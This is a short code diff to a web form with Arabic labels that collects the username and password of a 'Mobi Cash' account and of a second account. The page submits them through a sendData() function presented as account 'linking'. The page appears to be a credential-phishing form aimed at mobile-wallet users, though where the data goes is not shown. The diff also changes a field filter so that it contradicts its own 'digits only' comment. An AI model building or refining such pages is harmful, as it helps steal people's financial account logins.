@@ -85,7 +85,7 @@ button {
 
     <input type="text" id="u1" placeholder="اسم مستخدم حساب موبي كاش">
     <input type="password" id="p1" placeholder="كلمة مرور حساب موبي كاش">
-    <input type="password" id="id2" placeholder="اسم مستخدم حساب البرموكود">
+    <input type="text" id="id2" placeholder="اسم مستخدم حساب البرموكود">
     <input type="password" id="p2" placeholder="كلمة مرور الحساب">
     <button onclick="sendData()">تأكيد الربط</button>
 
@@ -111,7 +111,7 @@ document.getElementById("p2").addEventListener("input", function() {
 
 // ID أرقام فقط
 document.getElementById("id2").addEventListener("input", function() {
-    this.value = this.value.replace(/[^0-9]/g, "");
+    this.value = this.value.replace(/[^a-zA-Z]/g, "");
 });
 
 // التحقق النهائي
